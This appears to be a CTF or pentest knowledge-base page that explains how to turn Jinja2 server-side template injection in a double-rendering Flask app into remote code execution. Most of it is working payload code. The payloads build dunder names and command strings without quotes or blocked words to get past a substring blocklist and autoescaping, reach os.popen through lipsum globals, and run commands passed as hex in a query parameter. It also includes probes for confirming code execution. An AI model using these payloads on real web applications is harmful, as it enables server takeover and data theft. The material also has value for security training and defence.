# SSTI — Double Render with Quote- and Dunder-Free Payload

## When this applies

Your input is stored verbatim and later passed through a Flask/Jinja `render_template_string(rendered_template)` (the variable is template-rendered TWICE — once to assemble the outer page, once on the previously-stored content). Together with the double render, the target enforces a **substring blocklist** at submit time (e.g., rejects `__`, `file`, `write`, `__class__`, `__classes__`, `request[request.`), AND HTML autoescape converts the quote characters `"` and `'` to entities (`&quot;`, `&#39;`) before the second render — so any payload containing literal quotes becomes inert by the time Jinja re-evaluates it.

Net effect: a "normal" Jinja sandbox-escape payload (`{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}`) is dead. It has dunders (blocked), quotes (entitized), and the literal word `class` inside `__class__` (blocked).

## Technique

Two primitives combine to write a full payload with **no quotes**, **no `__` literal substring**, and **no blocked words**:

1. **Build short identifier strings via the kwarg trick.** `dict(class=1)|first` evaluates to the string `'class'`. Generally: `dict(<NAME>=1)|first` → `'<NAME>'`. Works for `class`, `globals`, `builtins`, `import`, `popen`, `read`, `os`, `bytes`, `decode`, `args`, `get`, `chr`. No quote in source; no `__`.

2. **Build the `__` prefix/suffix at runtime.** `(config|list)[5][6]` resolves to the `_` character (5th element of `config|list` is the `'SECRET_KEY'` string; index 6 is the underscore between `SECRET` and `KEY`). Concatenate: `(config|list)[5][6] ~ (config|list)[5][6]` → `'__'`. Indexes vary by Flask version — find any config key with an underscore at a fixed position and use that. `(self|list)`, `(g|list)`, or any iterable with a name containing `_` works.

3. **Chain `lipsum`/`cycler`/`config`/`self` through `|attr()`** with the runtime-built strings:

   ```jinja
   {{ lipsum
      |attr(  (config|list)[5][6]~(config|list)[5][6] ~ dict(globals=1)|first ~ (config|list)[5][6]~(config|list)[5][6] )
      [ (config|list)[5][6]~(config|list)[5][6] ~ dict(builtins=1)|first ~ (config|list)[5][6]~(config|list)[5][6] ]
      [ (config|list)[5][6]~(config|list)[5][6] ~ dict(import=1)|first ~ (config|list)[5][6]~(config|list)[5][6] ]
      ( dict(os=1)|first )
      |attr( dict(popen=1)|first ) ( <CMD_STRING> )
      |attr( dict(read=1)|first ) ()
   }}
   ```

   At evaluation this resolves to the Python expression that imports the `os` module and calls `popen(<cmd>).read()` — i.e., walks `lipsum.__globals__`, indexes `__builtins__`, then `__import__`, then invokes it with `os` as the module name.

4. **Build the command string without quotes** — use `bytes.fromhex()` or `chr()` chained with `~`:

   ```jinja
   ( lipsum|attr(...globals...)
            [...builtins...]
            [dict(bytes=1)|first]
       .fromhex( request|attr(dict(args=1)|first)|attr(dict(get=1)|first)(dict(c=1)|first) )
       |attr(dict(decode=1)|first)()
   )
   ```

   Then pass the actual command hex via the URL query: `?c=636174202f666c6167` decodes to `cat /flag`. The hex alphabet `[0-9a-f]` contains none of `i`, `l`, `t`, `r`, `w` — so the words `file`, `write` cannot appear by chance, and `__` cannot appear at all.

## Verifying success

- A no-op probe like `<CMD_STRING>` = hex of `id` returns the worker's uid/gid in the rendered page (confirms RCE).
- A read of a known root-readable file (e.g., `/etc/issue`) returns its content inline in the page where the SSTI fires.
- The injected message persists in the DB and renders identically on every reload — confirms it's the SECOND render firing, not a quirk of the first.

## Common pitfalls

- The "index 5/6" trick for `_` depends on the dict-key order of `app.config`. After Flask version bumps or extension loads, the `'SECRET_KEY'` key may shift positions. Generic alternative: `(joiner|attr(dict(init=1)|first)|attr(dict(globals=1)|first))[...]` — bootstrap from `joiner` instead, which has stable globals; or scan `config|list` indices via a quick probe `{{ (config|list)[i] }}` to find any key containing `_` and pick its underscore position.
- The first render usually has Jinja autoescape ON; the second may have it OFF (because the stored content is "trusted" by the developer). Confirm by injecting a literal `<b>X</b>` and seeing if `X` appears bold after reload. If autoescape is on for BOTH renders, your `~` concatenations of attribute names still work — only `{% raw %}` content blocks and `|safe` filter calls break.
- Some installations strip `lipsum` or `cycler` from the Jinja env. `joiner`, `range`, `dict`, `cycler`, `lipsum`, `namespace`, `dict.items` — try each via `{{ <name> }}` to see which globals are present.
- The 30-second gunicorn worker timeout limits long commands. Keep `<CMD>` short (`cat /flag` style); chain longer flows by writing intermediate output to `/tmp/<file>` and reading with a follow-up payload.

## Tools

- Python's `bytes.fromhex` + URL `request.args.get('c')` to keep the payload constant-size regardless of command length.
- Browser DevTools "Sources" panel breakpoint on the rendered HTML to confirm where escaping fires.
- [../../ssti-advanced.md](../../ssti-advanced.md) — engine fingerprinting + per-engine payload reference.
- [../../ssti-cheat-sheet.md](../../ssti-cheat-sheet.md) — quick sandbox-escape primitives for Twig, Freemarker, ERB.

## Related

- [../code-injection/python-eval-format-string.md](../code-injection/python-eval-format-string.md) — adjacent class when the sandbox is Python's `eval()` directly.
